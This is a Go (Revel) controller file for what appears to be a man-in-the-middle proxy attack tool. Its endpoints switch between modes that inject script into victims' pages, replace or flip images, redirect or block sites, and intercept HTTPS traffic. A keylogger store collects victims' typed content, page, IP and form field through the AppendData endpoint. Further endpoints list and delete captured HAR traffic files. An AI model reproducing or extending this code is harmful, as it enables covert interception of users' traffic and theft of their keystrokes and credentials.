package controllers

import (
	"github.com/revel/revel"
	"log"
	"io/ioutil"
	"os"
	"path/filepath"
)

//the temporary object that stores the logged data.
//probably should store to file for persistence
var data []KeyLog
//key logger object
type KeyLog struct {
	Page string //what page they were on when they typed it
	IP string //which client typed it
	Content string //what was typed
	Timestamp string //the time at which it was typed
	DomObject string //where the data was typed
}
/*
struct for storing result from a filePath Walker
so that can return it to the user.
*/
type Walker struct {
	files []string
}

type App struct {
	*revel.Controller
}

func (c App) FlipImages() revel.Result {
	KillProxy()
	listener = FlipImages()
	return c.RenderJson("")
}
func (c App) ReplaceImages() revel.Result {
	KillProxy()
	listener = ReplaceImages()
	return c.RenderJson("")
}
func (c App) InjectScript() revel.Result {
	var replace string
	var result string
	c.Params.Bind(&replace, "replace")
	c.Params.Bind(&result, "result")

	KillProxy()
	listener = InjectScript(replace, result)
	return c.RenderJson("")
}
func (c App) PassThrough() revel.Result {
	KillProxy()
	log.Println("A Simple Pass through of all information")
	listener = PassThrough()
	return c.RenderJson("")
}
func (c App) RedirectPage() revel.Result {
	KillProxy()
	log.Println("replacing...")
	listener = RedirectPage()
	return c.RenderJson(replace)
}
func (c App) BlockWebsites() revel.Result {
	KillProxy()
	listener = BlockWebsites()
	return c.RenderJson(banned)
}

func KillProxy() {
	if listener != nil {
		listener.Close()
	}
}

func (c App) GetData() revel.Result {
	return c.RenderJson(data)
}

func (c App) AppendData() revel.Result {
	var d string
	var p string
	c.Params.Bind(&d, "data")
	c.Params.Bind(&p, "page")
	if d != "" {
		var k KeyLog
		k.Page = p
		k.Content = d
		data = append(data, k)
		return c.RenderJson("updated")
	}
	return c.RenderJson("null")
}

func (c App) InterceptHTTPS() revel.Result {
	KillProxy()
	log.Println("interceptor")
	listener = HTTPSInterceptor()
	return c.RenderJson("")

}

//annoying cant use the file walker here - seems to have different header if I do
//which means it gets downloaded rather than displayed
func (c App) GetHars() revel.Result {
	var fileNames []string
	log.Println("reading hars")
	files, err := ioutil.ReadDir(SOURCE+"/hars/")
	if err != nil {
		log.Println("error: ", err)
	}
	for _, f := range files {
		log.Println(f.Name())
        fileNames = append(fileNames, f.Name())
    }
	return c.RenderJson(fileNames)
}
func (c App) DeleteHars() revel.Result {
	var w Walker
	filepath.Walk(SOURCE+"/hars", w.deletefiles)
	return c.RenderJson(w.files)
}

func (c App) Index() revel.Result {
	initializeBlockReplaceLists()
	return c.Render()
}

 func (w *Walker) deletefiles(path string, f os.FileInfo, err error) (e error) {

 	//must check for the directory otherwise end up deleting it!
 	if !f.Mode().IsDir() {
 		 log.Println(path)
 		 w.files = append(w.files, path)
 	}

 	//put this back in when you actually do want to clear the currently collected list
 	// os.Remove(path)
 	return
 }
